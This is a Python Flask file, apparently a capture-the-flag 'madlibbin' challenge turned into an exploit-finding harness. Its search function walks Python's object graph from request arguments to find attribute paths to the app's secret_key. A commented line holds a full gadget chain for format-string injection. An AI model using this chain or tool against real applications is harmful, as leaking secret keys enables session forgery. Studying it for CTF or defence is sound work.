#!/usr/bin/python3
import binascii
import json
import os
import re
import redis

from flask import Flask
from flask import request
from flask import redirect, render_template
from flask import abort

app = Flask(__name__)
app.secret_key = "flaga"

redis = redis.Redis(host='madlibbin_redis', port=6379, db=0)

generate = lambda: binascii.hexlify(os.urandom(16)).decode()
parse = lambda x: list(dict.fromkeys(re.findall(r'(?<=\{args\[)[\w\-\s]+(?=\]\})', x)))


def search(obj, max_depth):
    
    visited_clss = []
    visited_objs = []
    
    def visit(obj, path='obj', depth=0):
        yield path, obj
        
        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            # print(obj)

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)
        
        # attributes
        for name in dir(obj):
            if name.startswith('__') and name.endswith('__'):
                if name not in  ('__globals__', '__class__', '__self__',
                                 '__weakref__', '__objclass__', '__module__'):
                    continue
            attr = getattr(obj, name)
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)
        
        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass
        
        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)
            
    yield from visit(obj)


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/', methods=['POST'])
def create():
    tag = generate()
    template = request.form.get('template', '')
    madlib = {
        'template': template,
        'blanks': parse(template)
    }
    redis.set(tag, json.dumps(madlib))
    return redirect('/{}'.format(tag))

@app.route('/<tag>', methods=['GET'])
def view(tag):
    # if redis.exists(tag):

    # print(request.args.__class__.__weakref__.__objclass__._iter_hashitems.__globals__['__loader__'].__class__.__weakref__.__objclass__.get_data.__globals__['__loader__'].exec_module.__globals__['__builtins__']['__build_class__'].__self__.copyright.__class__._Printer__setup.__globals__['sys'].modules['__main__'].Flask.__weakref__.__objclass__.get_send_file_max_age.__globals__['current_app'].secret_key)
    
    print("xxx")
    for (i, s) in search(request.args, 20):
        try:
            if 'secret_key' in i:
                print(i)
                print('')
                # break
        except:
            pass
    return 'aaa'
    # madlib = json.loads(redis.get(tag))
    # if set(request.args.keys()) == set(madlib['blanks']):
    # 	return render_template('result.html', stuff=madlib['template'].format(args=request.args))
    # else:
    # 	return render_template('fill.html', blanks=madlib['blanks'])
    # else:
    # 	abort(404)

if __name__ == '__main__':
    app.run()